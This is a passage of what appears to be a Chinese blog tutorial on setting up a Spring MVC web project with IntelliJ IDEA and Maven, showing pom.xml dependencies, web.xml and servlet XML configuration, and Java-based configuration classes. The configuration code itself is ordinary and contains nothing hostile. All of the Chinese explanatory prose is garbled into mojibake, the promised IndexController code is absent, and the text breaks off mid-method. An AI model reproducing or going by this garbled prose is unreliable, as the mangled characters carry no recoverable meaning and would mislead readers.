<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124019431.png" alt="image-20200831124019431" style="zoom:150%;">

<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124057482.png" alt="image-20200831124057482" style="zoom:150%;">

<p>ç‚¹å‡»è¿è¡Œã€‚</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831124552744.png" alt="image-20200831124552744"></p>
<p>å¯ä»¥ä¿®æ”¹åº”ç”¨ä¸Šä¸‹æ–‡ä¸º<code>/</code></p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831130525066.png" alt="image-20200831130525066" style="zoom:150%;">

<p>å³å¯ä»¥åœ¨htp://localhost:8081è®¿é—®åˆ°hello world</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200831130458167.png" alt="image-20200831130458167"></p>
<h1 id="0x03-å¯¼å…¥Spring-MVC"><a href="#0x03-å¯¼å…¥Spring-MVC" class="headerlink" title="0x03 å¯¼å…¥Spring MVC"></a>0x03 å¯¼å…¥Spring MVC</h1><p>ç¼–è¾‘pom.xmlï¼Œæ·»åŠ spring</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-beans --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-beans<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-context --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-expression<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- å¯é€‰æ¨¡å—ï¼ŒæŒ‰éœ€æ·»åŠ  --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- AOP --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- åŸºäºä»£ç†çš„AOPæ”¯æŒ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- æä¾›ä¸AspectJçš„é›†æˆ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aspects<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-web --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.springframework/spring-webmvc --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.17.RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨<code>&lt;dependencies&gt;</code>æ ‡ç­¾ä¸­æ·»åŠ ä¸Šé¢çš„ä¾èµ–ï¼Œåœ¨é€‰æ‹©åŒ…çš„æ—¶å€™å¯ä»¥åˆ©ç”¨<a href="https://mvnrepository.com/è¿™ä¸ªç½‘ç«™æœç´¢å¤åˆ¶æŒ‡å®šç‰ˆæœ¬çš„pom.xmlæ–‡ä»¶å†…å®¹ã€‚" target="_blank" rel="noopener">https://mvnrepository.com/è¿™ä¸ªç½‘ç«™æœç´¢å¤åˆ¶æŒ‡å®šç‰ˆæœ¬çš„pom.xmlæ–‡ä»¶å†…å®¹ã€‚</a></p>
<p>æ·»åŠ æ¡†æ¶æ”¯æŒï¼Œé»˜è®¤çš„web.xmlæ˜¯</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">web-app</span> <span class="meta-keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"</span></span></span><br><span class="line"><span class="meta"> <span class="meta-string">"http://java.sun.com/dtd/web-app_2_3.dtd"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å½“Add Frameworks Supportä¹‹åï¼Œè¿™é‡Œé€‰æ‹©5.1.17.RELEASEç‰ˆæœ¬çš„springï¼ˆå¦‚æœæ²¡æœ‰Springï¼Œåœ¨Project Structureä¸­å°†Springå»æ‰å°±å¯ä»¥äº†ï¼‰</p>
<img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200902151112372.png" alt="image-20200902151112372" style="zoom:200%;">

<p>ä¼šæ–°ç”ŸæˆapplicationContext.xmlã€springMVC-servlet.xmlä¸¤ä¸ªæ–‡ä»¶ã€‚(ä¸åŒçš„springç‰ˆæœ¬ç”Ÿæˆçš„servleté…ç½®æ–‡ä»¶åä¸ä¸€å®šç›¸åŒ)</p>
<h1 id="0x04-é…ç½®-springMVC-ä¹‹-xml-é…ç½®"><a href="#0x04-é…ç½®-springMVC-ä¹‹-xml-é…ç½®" class="headerlink" title="0x04 é…ç½® springMVC ä¹‹ xml é…ç½®"></a>0x04 é…ç½® springMVC ä¹‹ xml é…ç½®</h1><p>é»˜è®¤ç”Ÿæˆçš„ä¸¤ä¸ªxmlæ–‡ä»¶å¦‚ä¸‹ï¼š</p>
<p>applicationContext.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>springMVC-servlet.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨web.xmlä¸­åŠ å…¥ä¸‹é¢çš„æ ‡ç­¾é…ç½®springMVC-servlet.xmlä½œä¸ºmvcçš„é…ç½®æ–‡ä»¶</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">"3.1"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!--welcome pages--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">welcome-file</span>&gt;</span>index.jsp<span class="tag">&lt;/<span class="name">welcome-file</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">welcome-file-list</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--é…ç½®springmvc DispatcherServlet--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--é…ç½®dispatcher.xmlä½œä¸ºmvcçš„é…ç½®æ–‡ä»¶--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>/WEB-INF/springMVC-servlet.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">async-supported</span>&gt;</span>true<span class="tag">&lt;/<span class="name">async-supported</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>ç¼–è¾‘springMVC-servlet.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:mvc</span>=<span class="string">"http://www.springframework.org/schema/mvc"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/beans/spring-beans.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/context/spring-context.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/mvc</span></span></span><br><span class="line"><span class="tag"><span class="string">       http://www.springframework.org/schema/mvc/spring-mvc-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- æ‰«æwebç›¸å…³çš„bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.mount4in"</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- å¼€å¯SpringMVCæ³¨è§£æ¨¡å¼ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:annotation-driven</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- é™æ€èµ„æºé»˜è®¤servleté…ç½® --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mvc:default-servlet-handler</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- é…ç½®jsp æ˜¾ç¤ºViewResolver --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"viewClass"</span> <span class="attr">value</span>=<span class="string">"org.springframework.web.servlet.view.JstlView"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"prefix"</span> <span class="attr">value</span>=<span class="string">"/WEB-INF/views/"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"suffix"</span> <span class="attr">value</span>=<span class="string">".jsp"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨javaæ–‡ä»¶å¤¹æ–°å»ºpackage:<code>com.mount4in.controller</code>ï¼Œä¹‹åæ–°å»ºIndexController.javaæ–‡ä»¶,å¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<p>è¿è¡Œç¨‹åºï¼š</p>
<p><img src="/2020/08/31/%E7%94%A8idea%E5%92%8Cmaven%E7%BC%96%E5%86%99spring%E9%A1%B9%E7%9B%AE/image-20200902152142870.png" alt="image-20200902152142870"></p>
<h1 id="0x05-é…ç½®springMVCä¹‹Javaé…ç½®"><a href="#0x05-é…ç½®springMVCä¹‹Javaé…ç½®" class="headerlink" title="0x05 é…ç½®springMVCä¹‹Javaé…ç½®"></a>0x05 é…ç½®springMVCä¹‹Javaé…ç½®</h1><p>æ–°å»ºcom.mounti4n.configåŒ…ï¼Œæ–°å»ºWebXmlã€ApplicationContextXmlå’ŒDispatcherServletXmlç±»åˆ†åˆ«ä»£æ›¿web.xmlã€application-context.xmlå’Œdispather-servlet.xmlï¼Œ</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//WebXml.java</span></span><br><span class="line"><span class="keyword">package</span> com.mount4in.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.support.AbstractAnnotationConfigDispatcherServletInitializer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">WebXml</span> <span class="keyword">extends</span> <span class="title">AbstractAnnotationConfigDispatcherServletInitializer</span></span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getRootConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Class&lt;?&gt;[] &#123;ApplicationContextXml<span class="class">.<span class="keyword">class</span>&#125;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &lt;!--é…ç½®springmvc DispatcherServlet--&gt;</span></span><br><span class="line"><span class="comment">        &lt;servlet&gt;</span></span><br><span class="line"><span class="comment">            &lt;servlet-name&gt;springMVC&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="comment">            &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt;</span></span><br><span class="line"><span class="comment">            &lt;init-param&gt;</span></span><br><span class="line"><span class="comment">                &lt;!--é…ç½®dispatcher.xmlä½œä¸ºmvcçš„é…ç½®æ–‡ä»¶--&gt;</span></span><br><span class="line"><span class="comment">                &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt;</span></span><br><span class="line"><span class="comment">                &lt;param-value&gt;/WEB-INF/dispatcher-servlet.xml&lt;/param-value&gt;</span></span><br><span class="line"><span class="comment">            &lt;/init-param&gt;</span></span><br><span class="line"><span class="comment">            &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span></span><br><span class="line"><span class="comment">            &lt;async-supported&gt;true&lt;/async-supported&gt;</span></span><br><span class="line"><span class="comment">        &lt;/servlet&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt;[] getServletConfigClasses() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Class&lt;?&gt;[] &#123;DispatcherServletXml<span class="class">.<span class="keyword">class</span>&#125;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        &lt;servlet-mapping&gt;</span></span><br><span class="line"><span class="comment">            &lt;servlet-name&gt;springMVC&lt;/servlet-name&gt;</span></span><br><span class="line"><span class="comment">            &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span></span><br><span class="line"><span class="comment">        &lt;/servlet-mapping&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> String[] getServletMappings() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> String[] &#123;<span class="string">"/"</span>&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ApplicationContextXml.java</span></span><br><span class="line"><span class="keyword">package</span> com.mount4in.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.FilterType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.EnableWebMvc;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    &lt;context:component-scan base-package="com.mount4in"/&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(basePackages = &#123;<span class="string">"com.mount4in"</span>&#125;,</span><br><span class="line">        excludeFilters = &#123;</span><br><span class="line">                <span class="meta">@ComponentScan</span>.Filter(type = FilterType.ANNOTATION, value = EnableWebMvc<span class="class">.<span class="keyword">class</span>)</span></span><br><span class="line"><span class="class">        &#125;)</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">public</span> <span class="title">class</span> <span class="title">ApplicationContextXml</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//DispatcherServletXml.java</span></span><br><span class="line"><span class="keyword">package</span> com.mount4in.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.ComponentScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.ViewResolver;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.view.InternalResourceViewResolver;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    &lt;!-- è‡ªåŠ¨æ‰«æè£…é… --&gt;</span></span><br><span class="line"><span class="comment">    &lt;context:component-scan base-package="com.mount4in.controller"/&gt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@ComponentScan</span>(<span class="string">"com.mount4in.controller"</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DispatcherServletXml</span> <span class="keyword">implements</span> <span class="title">WebMvcConfigurer</span> </span>&#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            &lt;!-- å¯¹æ¨¡å‹è§†å›¾åç§°çš„è§£æï¼Œå³åœ¨æ¨¡å‹è§†å›¾åç§°æ·»åŠ å‰åç¼€(å¦‚æœæœ€åä¸€ä¸ªè¿˜æ˜¯è¡¨ç¤ºæ–‡ä»¶å¤¹,åˆ™æœ€åçš„æ–œæ ä¸è¦æ¼äº†) ä½¿ç”¨JSP--&gt;</span></span><br><span class="line"><span class="comment">            &lt;!-- é»˜è®¤çš„è§†å›¾è§£æå™¨ åœ¨ä¸Šè¾¹çš„è§£æé”™è¯¯æ—¶ä½¿ç”¨ (é»˜è®¤ä½¿ç”¨html)- --&gt;</span></span><br><span class="line"><span class="comment">            &lt;bean id="defaultViewResolver" class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="viewClass" value="org.springframework.web.servlet.view.JstlView"/&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="prefix" value="/WEB-INF/views/"/&gt;&lt;!--è®¾ç½®JSPæ–‡ä»¶çš„ç›®å½•ä½ç½®--&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="suffix" value=".jsp"/&gt;</span></span><br><span class="line"><span class="comment">                &lt;property name="exposeContextBeansAsAttributes" value="true"/&gt;</span></span><br><span class="line"><span class="comment">            &lt;/bean&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="meta">@Bean</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> ViewResolver <span class="title">viewResolver</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            InternalResourceViewResolver resolver = <span class="keyword">new</span> InternalResourceViewResolver();</span><br><span class="line">            